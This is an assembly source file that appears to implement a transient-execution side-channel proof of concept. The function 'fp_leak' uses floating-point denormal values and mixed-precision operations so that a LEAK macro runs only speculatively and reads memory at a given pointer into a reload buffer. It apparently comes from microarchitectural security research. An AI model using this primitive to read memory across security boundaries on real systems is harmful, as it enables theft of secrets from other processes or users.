%include "common.S"

%define X_VAL   0x0010000000000000
%define Y_VAL   0x4340000000000000

section .data noexec write
    ;Memory for xmm backup
    align 64
    fp_regs:
    %rep 0x1000
    db  0x0
    %endrep

    align 64
    x:
    %rep 8
    dq X_VAL
    %endrep

    align 64
    y:
    %rep 8
    dq Y_VAL
    %endrep

section .text
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; fp_leak(uint8_t *reload_buffer, uint8_t *ptr)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global fp_leak
align 64
fp_leak:
    ;Backup used xmm registers + Setup
    movdqu  [fp_regs]   , xmm0 
    movdqu  [fp_regs+64], xmm1 


    movsd xmm0, [x]
    movsd xmm1, [y]

;;;;;;; Compute correct value in RCX ;;;;;
%rep 32
    xorpd xmm10, xmm10 
    haddpd xmm10, xmm0
    vcvtpd2ps xmm12, xmm10  ; Explicitly suppress any chance of transient execution
    vaddsubps xmm11, xmm10
%endrep
movq rcx, xmm11        ; Architecturally correct value stored in RCX
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;; Intermixing precision ;;;;;;;
%rep 32
    xorpd xmm10, xmm10
    haddpd xmm10, xmm0
    vaddsubps xmm11, xmm10
%endrep 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

    movq    rax, xmm11
    cmp     rax, rcx
    je      fp_leak_arch
; Should not execute architecturally
    LEAK    rdi, rsi
fp_leak_arch:
    ;Restore used xmm registers
    movdqu  xmm0, [fp_regs]
    movdqu  xmm1, [fp_regs+64]
    ret
